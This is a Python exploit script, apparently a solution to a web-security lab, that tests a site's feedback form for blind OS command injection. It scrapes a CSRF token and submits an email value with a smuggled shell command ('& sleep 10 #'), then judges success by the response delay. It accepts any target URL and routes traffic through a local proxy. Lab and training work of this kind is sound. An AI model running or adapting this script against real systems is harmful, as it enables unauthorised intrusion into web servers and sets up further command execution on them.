import sys
import requests
from bs4 import BeautifulSoup as bs
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def csrft(s, url):
    feedback_path = 'feedback'
    r = s.get(url + feedback_path, verify=False, proxies=proxies)
    soup = bs(r.text, 'html.parser')
    csrf = soup.find("input")['value']
    return csrf

def exploit(url, s):
    u = url + "feedback/submit"
    csrf = csrft(s, url)
    data = {'csrf': csrf,'name':'a','email':f'a@a.com & sleep 10 #','subject':'a','message':'a'}
    r = s.post(u, data=data, verify=False, proxies=proxies)
    if (r.elapsed.total_seconds() >=9):
        print("Time-based command injection!")
    else:
        print("Not Time-based command injection!")


def main():
    try:
        url = sys.argv[1]
        s = requests.Session()
        exploit(url, s)
    except IndexError:
        print("Usage: %s <url>" % sys.argv[0])
        sys.exit(-1)

if __name__ == '__main__':
    main()
